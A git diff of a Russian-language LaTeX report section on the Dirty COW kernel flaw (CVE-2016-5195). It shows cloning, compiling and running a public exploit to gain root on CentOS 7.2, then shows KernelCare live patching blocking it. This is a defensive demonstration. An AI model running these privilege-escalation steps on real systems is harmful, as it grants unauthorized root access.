@@ -290,42 +290,57 @@ diff --git a/fs/ecryptfs/kthread.c b/fs/ecryptfs/kthread.c
 
 \subsection{Эксплуатация уязвимостии ядра Linux CVE-2016-5195 <<Dirty COW>>}
 
-\begin{lstlisting}
-ETO CHISTIJ ISO CENTOS 7.2
+Наиболее опасной уязвимостью 2016~г. является CVE-2016-5195 с кодовым именем <<Dirty COW>>.
+Такая степень опасности обусловлена тем, что ей подвержены практически все ядра Linux начиная с версии 2.6.22, а также легкостью применения эксплоитов.
 
-[root@master ~]# cat /etc/redhat-release
+В данном разделе применяется эксплоит \cite{dcowexp}, позволяющий получить права суперпользоваться из-под локального пользователя.
+
+Для эксплуатации используется дистрибутив CentOS:
+\begin{lstlisting}
+# cat /etc/redhat-release
 CentOS Linux release 7.2.1511 (Core)
-[root@master ~]# uname -r
+# uname -r
 3.10.0-327.el7.x86_64
-[root@master ~]# su dcow
-[dcow@master ~]$ id
-uid=1000(dcow) gid=1000(dcow) groups=1000(dcow) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-[dcow@master ~]$ git clone https://github.com/gbonacini/CVE-2016-5195.git
-[dcow@master ~]$ cd CVE-2016-5195/
-[dcow@master CVE-2016-5195]$ make
+\end{lstlisting}
+
+Необходимо повысить привилегии локального пользователя dcow до суперпользователя root, для этого необходимо скачать эксплоит и установить инструменты для компиляции (gcc/g++).
+После установки всех необходимых настроек компилируем код эксплоита:
+\begin{lstlisting}
+$ id
+uid=1000(dcow) gid=1000(dcow) groups=1000(dcow)
+$ git clone https://github.com/gbonacini/CVE-2016-5195
+$ cd CVE-2016-5195/
+$ make
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
-[dcow@master CVE-2016-5195]$ ./dcow
+\end{lstlisting}
+
+После компиляции исходного кода эксплоита, в текущем каталоге появляется бинарный файл, запуск которого в автоматическом режиме позволяет получить права доступа суперпользователя и сменить его пароль на <<dirtyCowFun>>:
+\begin{lstlisting}
+$ ./dcow
 Running ...
 Received su prompt (Password: )
 Root password is:   dirtyCowFun
 Enjoy! :-)
-[dcow@master CVE-2016-5195]$ su root
+$ su root
 Password: dirtyCowFun
-[root@master ~]# id
-uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+# id
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
 
+Для исправления уязвимости в кратчайшие сроки для ядра Linux был внесен патч, а мейнтейнеры дистрибутивов опубликовали пакеты с исправлениями.
+Для обновления дистрибутива и устранения уязвимости необходимо скачать исправленную версию ядра и произвести перезагрузку.
 
-[root@master ~]# rpm -i http://patches.kernelcare.com/kernelcare-latest.el6.x86_64.rpm
-[root@master ~]# /usr/bin/kcarectl --info
-kpatch-state: patch is applied
-kpatch-for: Linux version 3.10.0-327.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.3 20140911 (Red Hat 4.8.3-9) (GCC) ) #1 SMP Thu Nov 19 22:10:57 UTC 2015
-kpatch-build-time: Mon Nov  7 17:08:08 2016
-kpatch-description: 20;3.10.0-327.36.3.el7.x86_64
-[root@master ~]# /usr/bin/kcarectl --update
-Kernel is safe
-[root@master ~]# /usr/bin/kcarectl --uname
+В случае когда целый парк серверов не имеет возможности совершать перезагрузку необходимо использовать такие технологии как kpatch, livepatch, KernelCare.
+Подобные технологии позволяют применять патчи для ядра Linux без перезагрузки.
+
+Технология KernelCare является коммерческим решением и позволяет без особых проблем в оперативном порядке использовать патчи для ядра, в том числе патч для CVE-2016-5195.
+
+Пример эксплуатации уязвимости при использовании KernelCare:
+
+\begin{lstlisting}
+# /usr/bin/kcarectl --uname
 3.10.0-327.36.3.el7.x86_64
-[root@master ~]# /usr/bin/kcarectl --patch-info  | grep CVE-2016-5195 -A3 -B3
+# /usr/bin/kcarectl --patch-info  | grep CVE-2016-5195 -A3 -B3
 kpatch-name: 3.10.0/0001-mm-remove-gup_flags-FOLL_WRITE-games-from-__get_user-327.patch
 kpatch-description: mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
 kpatch-kernel: >kernel-3.10.0-327.36.2.el7
@@ -333,31 +348,27 @@ kpatch-cve: CVE-2016-5195
 kpatch-cvss: 6.9
 kpatch-cve-url: https://access.redhat.com/security/cve/cve-2016-5195
 kpatch-patch-url: https://git.kernel.org/linus/19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
-
-[root@master ~]# uname -r
-3.10.0-327.el7.x86_64
-
-
-PROVEROCHKA
-[dcow@master CVE-2016-5195]$ ./dcow
+$ ./dcow
 Running ...
-NE RABOTAET
+\end{lstlisting}
 
-4$/YEAR ZA 1 LICENZIUY
+Как видно из вывода команд, эксплоит не работает при включенном KernelCare.
 
-OTKLUYCHAEM
-[root@master ~]# /usr/bin/kcarectl --unload
+Пример отключения KernelCare и попытка эксплуатации уязвимости:
+\begin{lstlisting}
+# /usr/bin/kcarectl --unload
 Updates already downloaded
 KernelCare protection disabled, kernel might not be safe
-[root@master ~]# su - dcow
-Last login: Wed Dec  7 17:18:42 MSK 2016 on pts/0
-[dcow@master ~]$ cd CVE-2016-5195/
-[dcow@master CVE-2016-5195]$ ./dcow
+# su - dcow
+$ cd CVE-2016-5195/
+$ ./dcow
 Running ...
 Received su prompt (Password: )
 Root password is:   dirtyCowFun
 Enjoy! :-)
-
 \end{lstlisting}
+
+Стоимость одной лицензии KernelCare составляет 4\$/г.
+В облачной среде, где при каждой минуте простоя работы облачный провайдер теряет деньги, использование подобных технологий позволяет существенно уменьшить даунтайм серверов.
 
 \clearpage
